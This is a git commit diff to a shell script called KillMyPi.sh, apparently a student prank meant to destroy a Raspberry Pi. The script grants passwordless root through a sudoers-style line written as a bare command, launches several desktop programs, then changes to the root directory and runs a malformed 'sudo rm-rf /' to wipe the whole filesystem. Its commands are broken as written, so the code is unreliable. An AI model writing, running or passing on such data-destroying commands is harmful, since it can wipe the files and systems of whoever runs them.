d872274072ab745797e20a760475f5cc2b9ab697
Harry <harry.carrigan@walnuts.milton-keynes.sch.uk>
2017-02-15 01:24:05 +0000

    Update KillMyPi.sh

--- KillMyPi.sh
+++ KillMyPi.sh
@@ -4,9 +4,29 @@
 # It should work with most raspberry pis
 # if it doesnt work replace pi with your username on your pc
 # not-tested-for-obvious-reasons
+
+
+
+# So that we get root permissions [most pi's our just called pi]
+
 pi ALL=(ALL) NOPASSWD: ALL
 echo "KillMyPi"
 echo "RUNNING"
+
+
+
+# Alot of programs to make sure it dies
+
+penguinpuzzle
+gimp
+midori
+chromium-browser
+geany
+
+
+
+# and finally the code that will end it once and for all
+
 cd /
 sudo rm-rf /
-echo "good bye"
+echo "good bye cruel world"
